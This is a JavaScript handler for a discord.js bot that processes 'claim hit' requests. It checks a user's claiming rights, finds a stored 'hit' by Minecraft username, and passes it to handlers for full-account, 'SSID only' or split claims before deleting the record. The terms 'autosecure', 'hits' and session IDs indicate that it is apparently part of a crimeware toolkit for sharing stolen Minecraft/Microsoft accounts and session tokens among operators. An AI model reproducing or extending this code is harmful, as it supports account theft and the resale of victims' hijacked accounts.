const { ApplicationCommandOptionType, TextInputStyle } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { 
    handleAutosecureHit,
    handleBotOwnerClaim,
    handleFullAccount,
    handleSSIDOnly,
    handleSplitClaim
} = require("../../utils/bot/claimutils");

module.exports = {
    name: "claimmodal",
    callback: async (client, interaction) => {
        let replied = false;
        const safeReply = async (options) => {
            if (!replied) {
                replied = true;
                return interaction.reply(options);
            }
        };

        try {
            const enteredUsername = interaction.fields.getTextInputValue('username');
            const customIdParts = interaction.customId.split('|');
            const storedName = customIdParts[1]; 
            
            const isBotOwner = interaction.user.id === client.username;
            let user = null;
            
            if (!isBotOwner) {
                user = await client.queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id]);
                
                if (user.length === 0) {
                    return safeReply({ content: `You're not a user of this bot!`, ephemeral: true });
                }
                user = user[0];
                if (user.claiming === -1) {
                    return safeReply({ content: `You don't have access to claim hits!`, ephemeral: true });
                }
            }

            let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
            if (settings.length === 0) {
                return safeReply({ content: `This server isn't setup properly!`, ephemeral: true });
            }
            settings = settings[0];

            if (settings.claiming === 0) {
                return safeReply({ content: `Claiming is currently disabled!`, ephemeral: true });
            }

            let channelId, guildId = null;
            if (settings.logs_channel) {
                [channelId, guildId] = settings.logs_channel.split("|");
            } else {
                return safeReply({ content: `Add a logs channel first!\nYour admins can do that using the command **/set**`, ephemeral: true });
            }

            let hitData = await client.queryParams("SELECT * FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, storedName]);
            
            if (!hitData || hitData.length === 0) {
                hitData = await client.queryParams("SELECT * FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, enteredUsername]);
            }

            if (!hitData || hitData.length === 0) {
                return safeReply({ content: `Couldn't find your hit!`, ephemeral: true });
            }

            const hit = JSON.parse(hitData[0].data);
            
            // Check claim method validation
            const claimMethod = settings.claim_method || 0;
            
            if (claimMethod === 1) {
                // Username + User ID method: Check if input contains user ID
                const inputParts = enteredUsername.split(' ');
                const hasUserId = inputParts.length >= 2 && inputParts[1] === interaction.user.id;
                
                if (!hasUserId) {
                    return safeReply({ content: `Please enter both username and your User ID (${interaction.user.id}) separated by a space!`, ephemeral: true });
                }
                
                // Use the username part for validation
                const usernameOnly = inputParts[0];
                
                if (!hit.embeds) { 
                    const { mcname } = hit;
                    
                    if (usernameOnly.toLowerCase() !== storedName.toLowerCase() && 
                        usernameOnly.toLowerCase() !== mcname.toLowerCase()) {
                        return safeReply({ content: `You didn't enter the right username for the selected hit!`, ephemeral: true });
                    }
                } else {
                    if (usernameOnly.toLowerCase() !== storedName.toLowerCase()) {
                        return safeReply({ content: `You didn't enter the right username for the selected hit!`, ephemeral: true });
                    }
                }
            } else {
                // Username only method (original logic)
                if (!hit.embeds) { 
                    const { mcname } = hit;
                    
                    if (enteredUsername.toLowerCase() !== storedName.toLowerCase() && 
                        enteredUsername.toLowerCase() !== mcname.toLowerCase()) {
                        return safeReply({ content: `You didn't enter the right username for the selected hit!`, ephemeral: true });
                    }
                } else {
                    if (enteredUsername.toLowerCase() !== storedName.toLowerCase()) {
                        return safeReply({ content: `You didn't enter the right username for the selected hit!`, ephemeral: true });
                    }
                }
            }

            if (hit.embeds) {
                await handleAutosecureHit(client, interaction, hit, guildId, channelId, storedName, isBotOwner);
                await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, storedName]);
            } else {
                const { acc, uid, mcname } = hit;
                
                if (isBotOwner) {
                    await handleBotOwnerClaim(client, interaction, acc, uid, guildId, channelId, mcname);
                } else if (user.split > 1) {
                    await handleSplitClaim(client, interaction, acc, uid, guildId, channelId, mcname, user);
                } else if (user?.claiming === 1) {
                    await handleFullAccount(client, interaction, acc, uid, guildId, channelId, mcname, user);
                } else {
                    await handleSSIDOnly(client, interaction, acc, guildId, channelId, mcname, user);
                }
                await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, mcname]);
                await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, acc.oldName]);
            }
            
           
        } catch (error) {
            console.error("Error in claim modal:", error);
            if (!replied) {
                return safeReply({ 
                    content: `An unexpected error occurred while processing your request. Please try again later.`, 
                    ephemeral: true 
                });
            }
        }
    }
};